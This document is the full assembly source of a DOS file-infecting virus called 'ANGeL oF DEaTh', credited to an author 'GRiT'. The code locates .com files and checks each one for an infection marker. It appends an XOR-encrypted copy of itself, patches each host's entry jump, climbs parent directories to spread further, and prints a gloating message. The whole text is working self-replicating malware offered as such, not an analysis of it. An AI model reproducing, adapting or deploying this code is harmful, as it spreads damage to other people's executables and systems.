;#########################################################################
;# Virus Name:ANGeL oF DEaTh                # Size: 382 Bytes            #
;# Author:GRiT                              # EMail: grit@imstressed.com #
;#########################################################################

	.model	tiny
	.radix	16
	.code

host:
        call    start
        nop
        nop
        nop

start:
                        call    $+3
                        pop     di
                        sub     di,offset $-1
                        xchg    di,bp

                        call    decrypt_encrypt
;                        call    calls_lab

start_crypted_area:
                        mov     di,100h
                               lea     si,[bp+offset orig6]
                        movsw
                        movsw
                        movsw
                        
                        mov      ah,1ah
                               lea dx,[bp+offset dta]
                        int     21h

calls_lab:              call find_first
infect:                 call open_file
                        mov     ah,00h
                        int     1Ah                             ;Get Timer
                        mov     word ptr [bp+offset enc_val],dx ;Save Value

                        mov     ah,3Fh
                        mov     cx,6h                           ;Headr Len
                               lea     dx,[bp+offset orig6]
                        int     21h                        ;Get orig code!

;67h,77h,87h
                        cmp     byte ptr [bp+offset orig6+3h],67h
                        jne     continue
                        cmp     byte ptr [bp+offset orig6+4h],77h
                        jne     continue
                        cmp     byte ptr [bp+offset orig6+5h],87h
                        jne     continue
                        jmp     doneit
continue:
                        mov     ax,4202h
                        xor     cx,cx
                        xor     dx,dx
                        int     21h

                        sub     ax,03h
                        mov     word ptr [bp+offset new6+1h],ax

                        call write_file

                        mov     ax,4200h
                        xor     cx,cx
                        xor     dx,dx
                        int     21h

                        mov     ah,40h
                        mov     cx,6
                               lea     dx,[bp+offset new6]
                        int     21h

doneit:
                        call close_file
                        call find_next
                        jnc  infect
                        call change_directory
                        jnc  calls_lab

                        mov     ah, 9h
                               lea dx,[bp+offset msg]
                        int     21h

                        call exit_to_dos

find_first:             mov      ah, 4eh
                              lea dx,[bp+offset fspec]
                        int     21h
                        ret

open_file:              mov     ax, 3d02h
                              lea dx,[bp+offset dta+1eh]
                        int     21h
                        xchg ax,bx
                        ret

find_next:              mov     ah,4fh
                        int     21h
                        ret

close_file:             mov ah, 3eh
                        int     21h
                        ret

exit_to_dos:            mov     ax,100h
                        push    ax
                        ret

change_directory:       mov ah, 3bh
                              lea dx,[bp+offset dotdot]
                        int     21h
                        ret

v_name  db    '[ANGeL oF DEaTh]',0
author  db    '[GRiT /ASM]',0
dotdot  db    '..',0
fspec   db    '*.com',0
orig6   db    0cdh,20h,00h,00h,00h,00h
new6    db    0e9h,00h,00h,67h,77h,87h
msg     db    'I am the angel of death! and i''ve come for your computers'
        db    0Dh,0Ah,'soul! ha ha ha evil laugh kind of thing!!!!!!!$'
end_crypted_area:

decrypt_encrypt:
                        push    bx
                        mov     cx,enc_len
                        lea     bx,[bp+offset start_crypted_area]
                        mov     ax,[bp+offset enc_val]

xor_l:                  xor     [bx],ax
                        inc     bx
                        inc     bx
                        loop    xor_l
                        pop     bx
                        ret

write_file:
                        call    decrypt_encrypt
                        mov     ah,40h
                        lea     dx,[bp+offset start]
                        mov     cx, V_len
                        int     21h
                        call    decrypt_encrypt
                        ret

enc_len equ     (offset end_crypted_area - offset start_crypted_area) / 2
enc_val dw      00h
V_len   equ     offset heap - offset start      ;??
heap:
dta	equ	$
	end
